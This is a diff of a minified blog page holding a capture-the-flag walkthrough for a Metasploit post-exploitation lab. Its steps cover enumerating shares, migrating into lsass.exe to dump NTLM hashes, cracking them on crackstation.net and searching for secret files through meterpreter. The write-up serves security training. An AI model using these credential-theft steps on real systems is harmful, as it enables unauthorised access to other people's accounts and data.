-<td>What is the Twitter password revealed in the &ldquo;secrets.txt&rdquo; file?</td>
-<td><a href=#6>5.6</a></td>
-</tr>
-<tr>
-<td>Where is the &ldquo;realsecret.txt&rdquo; file located?</td>
-<td><a href=#8>5.7</a></td>
-</tr>
-<tr>
-<td>What is the real secret?</td>
-<td><a href=#8>5.8</a></td>
-</tr>
-</tbody>
-</table>
-<h2 id=solutions>solutions</h2>
-<h3 id=1-sysinfo>1 sysinfo</h3>
-<p><img src=https://i.imgur.com/vLx7TvS.png alt=img></p>
-<h3 id=3>3</h3>
-<ul>
+<td>What is the computer name?</td><td><a href=#1-sysinfo>5.1</a></td></tr><tr>
+<td>What is the target domain?</td><td><a href=#1-sysinfo>5.1</a></td></tr><tr>
+<td>What is the name of the share likely created by the user?</td><td><a href=#3>5.3</a></td></tr><tr>
+<td>What is the NTLM hash of the jchambers user?</td><td><a href=#4>5.4</a></td></tr><tr>
+<td>What is the cleartext password of the jchambers user?</td><td><a href=#5>5.5</a></td></tr><tr>
+<td>Where is the &ldquo;secrets.txt&rdquo; file located?</td><td><a href=#6>5.6</a></td></tr><tr>
+<td>What is the Twitter password revealed in the &ldquo;secrets.txt&rdquo; file?</td><td><a href=#6>5.6</a></td></tr><tr>
+<td>Where is the &ldquo;realsecret.txt&rdquo; file located?</td><td><a href=#8>5.7</a></td></tr><tr>
+<td>What is the real secret?</td><td><a href=#8>5.8</a></td></tr></tbody></table><h2 id=solutions>solutions</h2><h3 id=1-sysinfo>1 sysinfo</h3><p><img src=https://i.imgur.com/vLx7TvS.png alt=img></p><h3 id=3>3</h3><ul>
 <li>
-<p>run this post exploit <code>post/windows/gather/enum_shares</code></p>
-<p><img src=https://i.imgur.com/bZUmBgH.png alt=img></p>
-</li>
-</ul>
-<h3 id=4>4</h3>
-<ul>
+<p>run this post exploit <code>post/windows/gather/enum_shares</code></p><p><img src=https://i.imgur.com/bZUmBgH.png alt=img></p></li></ul><h3 id=4>4</h3><ul>
 <li>
-<p>You will need to migrate to the &ldquo;lsass.exe&rdquo; process first</p>
-</li>
+<p>You will need to migrate to the &ldquo;lsass.exe&rdquo; process first</p></li><li>
+<p>run <code>ps | grep lsass</code> to find the PID</p></li><li>
+<p>migrration</p><p><img src=https://i.imgur.com/rLs9H9k.png alt=img></p></li><li>
+<p>hashes</p><p><img src=https://i.imgur.com/8ewXMTD.png alt=img></p></li></ul><h3 id=5>5</h3><ul>
+<li>goto <code>crackstation.net</code> and find the password</li></ul><h3 id=6>6</h3><ul>
 <li>
-<p>run <code>ps | grep lsass</code> to find the PID</p>
-</li>
+<p>run this command in <code>meterpreter > search -f *.txt</code></p></li><li>
+<p>results</p><p><img src=https://i.imgur.com/FNcOAwE.png alt=img></p></li></ul><h3 id=8>8</h3><ul>
 <li>
-<p>migrration</p>
-<p><img src=https://i.imgur.com/rLs9H9k.png alt=img></p>
-</li>
-<li>
-<p>hashes</p>
-<p><img src=https://i.imgur.com/8ewXMTD.png alt=img></p>
-</li>
-</ul>
-<h3 id=5>5</h3>
-<ul>
-<li>goto <code>crackstation.net</code> and find the password</li>
-</ul>
-<h3 id=6>6</h3>
-<ul>
-<li>
-<p>run this command in <code>meterpreter > search -f *.txt</code></p>
-</li>
-<li>
-<p>results</p>
-<p><img src=https://i.imgur.com/FNcOAwE.png alt=img></p>
-</li>
-</ul>
-<h3 id=8>8</h3>
-<ul>
-<li>
-<p>run this command in <code>search -f realsecret.txt</code></p>
-</li>
-<li>
-<p>results</p>
-<p><img src=https://i.imgur.com/Fu0OQJa.png alt=img></p>
-</li>
-</ul>
-<hr>
+<p>run this command in <code>search -f realsecret.txt</code></p></li><li>
+<p>results</p><p><img src=https://i.imgur.com/Fu0OQJa.png alt=img></p></li></ul><hr>
 <script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
-<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p>
-<script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
+<p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script>
 <script data-name=BMC-Widget data-cfasync=false src=https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js data-id=anir0y data-description="Support me on Buy me a coffee!" data-message data-color=#5F7FFF data-position=Right data-x_margin=18 data-y_margin=18></script>
-</article>
-</section>
-</div>
-</div>
-<footer class="ui basic center aligned segment" style=background-color:transparent>
-<p>© 2010 - 2022 Classroom</p>
-</footer>
-</div>
-</section>
-<section class=back>
+</article></section></div></div><footer class="ui basic center aligned segment" style=background-color:transparent>
+<p>© 2010 - 2022 Classroom</p></footer></div></section><section class=back>
 <div class=dream-max-width>
 <header class="ui basic very padded segment dream-header">
 <div class="ui small circular image">
 <img src=/img/avatar.jpeg>
-</div>
-<div class=content>
-<h1 class="ui medium header">Classroom Notes & Blog Posts<div class="sub header"></div>
-</h1>
-<article class="ui horizontal list">
+</div><div class=content>
+<h1 class="ui medium header">Classroom Notes & Blog Posts<div class="sub header"></div></h1><article class="ui horizontal list">
 <a class=item href=/categories>
 <i class="th list icon" title="All Categories"></i>
 </a>
 <a class=item href=/tags>
 <i class="tags icon" title="All Tags"></i>
 </a>
-</article>
-<article class=dream-tags>
+</article><article class=dream-tags>
 <a class="ui label" href=/tags/agent-sudo/ title="Agent Sudo">
 Agent Sudo
 </a>
@@ -572,6 +318,9 @@ domain
 </a>
 <a class="ui label" href=/tags/dominos/ title=dominos>
 dominos
+</a>
+<a class="ui label" href=/tags/dvwa/ title=dvwa>
+dvwa
 </a>
 <a class="ui label" href=/tags/empire/ title=Empire>
 Empire
@@ -759,63 +508,42 @@ web scanning
 <a class="ui label" href=/tags/wireshark/ title=wireshark>
 wireshark
 </a>
-</article>
-</div>
-</header>
-<div class="ui relaxed grid dream-grid dream-back">
+</article></div></header><div class="ui relaxed grid dream-grid dream-back">
 <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
 <article class="ui segment">
-<h3 class="ui header">Social Links</h3>
-<nav class="ui secondary menu dream-menu dream-socials">
+<h3 class="ui header">Social Links</h3><nav class="ui secondary menu dream-menu dream-socials">
 <div class=item>
 <a href=/index.xml>
 <i class="large rss square icon" title=RSS></i>
 </a>
-</div>
-<div class=item>
+</div><div class=item>
 <a href=mailto:classroom@anir0y.in>
 <i class="large mail icon" title=Email></i>
 </a>
-</div>
-<div class=item>
+</div><div class=item>
 <a href=https://twitter.com/anir0y target=_blank>
 <i class="large twitter icon" title=Twitter></i>
 </a>
-</div>
-<div class=item>
+</div><div class=item>
 <a href=https://facebook.com/anir0yofficial target=_blank>
 <i class="large facebook icon" title=Facebook></i>
 </a>
-</div>
-<div class=item>
+</div><div class=item>
 <a href=https://instagram.com/anir0yofficial target=_blank>
 <i class="large instagram icon" title=Instagram></i>
 </a>
-</div>
-<div class=item>
+</div><div class=item>
 <a href=https://www.linkedin.com/in/anir0y target=_blank>
 <i class="large linkedin icon" title=Linkedin></i>
 </a>
-</div>
-<div class=item>
+</div><div class=item>
 <a href=https://github.com/anir0y target=_blank>
 <i class="large github icon" title=GitHub></i>
 </a>
-</div>
-</nav>
-</article>
-</div>
-<div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+</div></nav></article></div><div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
 <article class="ui segment">
 YOU CAN RESUE MY CONTENT
-</article>
-</div>
-</div>
-</div>
-</section>
-</div>
-</div>
-<script>window.defaultDark=null,window.backgroundDark="black",window.backgroundImageDark=null,window.darkNav=!0,window.hasTwitterEmbed=!0,window.hasTwitterEmbed&&(window.twttr=function(c,d,e){var b,f=c.getElementsByTagName(d)[0],a=window.twttr||{};return c.getElementById(e)?a:(b=c.createElement(d),b.id=e,b.src='https://platform.twitter.com/widgets.js',f.parentNode.insertBefore(b,f),a._e=[],a.ready=function(b){a._e.push(b)},a)}(document,'script','twitter-wjs'))</script>
+</article></div></div></div></section></div></div><script>window.defaultDark=null,window.backgroundDark="black",window.backgroundImageDark=null,window.darkNav=!0,window.hasTwitterEmbed=!0,window.hasTwitterEmbed&&(window.twttr=function(n,s,o){var t,i=n.getElementsByTagName(s)[0],e=window.twttr||{};return n.getElementById(o)?e:(t=n.createElement(s),t.id=o,t.src="https://platform.twitter.com/widgets.js",i.parentNode.insertBefore(t,i),e._e=[],e.ready=function(t){e._e.push(t)},e)}(document,"script","twitter-wjs"))</script>
 <script src=/js/jquery.min.js></script>
 <script src=/js/semantic.min.js></script>
 <script src=/js/jquery.overlayScrollbars.min.js></script>
@@ -827,16 +555,11 @@ YOU CAN RESUE MY CONTENT
 <script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js></script>
 <script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js></script>
 <script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js></script>
-<script>hljs.initHighlightingOnLoad(),setHighlightTheme();function setHighlightTheme(){var a=localStore.getItem('hugo-theme-dream-is-dark'),b,c,d;a=a?a:window.defaultDark?'y':a,b="tomorrow",c="tomorrow-night",d=a==='y'?c:b,$('link[data-highlight]').attr('href','https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/'+d+'.min.css'),$('pre').css('background',a==='y'?'#333':'')}</script>
+<script>hljs.initHighlightingOnLoad(),setHighlightTheme();function setHighlightTheme(){var e=localStore.getItem("hugo-theme-dream-is-dark"),t,n,s;e=e?e:window.defaultDark?"y":e,t="tomorrow",n="tomorrow-night",s=e==="y"?n:t,$("link[data-highlight]").attr("href","https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/"+s+".min.css"),$("pre").css("background",e==="y"?"#333":'')}</script>
 <div class="ui inverted segment" id=dream-search>
 <div class="ui search">
 <div class="ui transparent input">
 <input class=prompt type=text placeholder=Search>
-</div>
-<div class=results></div>
-</div>
-</div>
-<script>$(document).ready(function(){$.getJSON('https://classroom.anir0y.in/index.json',function(a){$('.ui.search').search({source:a,searchFields:['title'],showNoResults:!0})})})</script>
+</div><div class=results></div></div></div><script>$(document).ready(function(){$.getJSON("https://classroom.anir0y.in/index.json",function(e){$(".ui.search").search({source:e,searchFields:["title"],showNoResults:!0})})})</script>
 <script src=/js/search.js></script>
-</body>
-</html>
+</body></html>
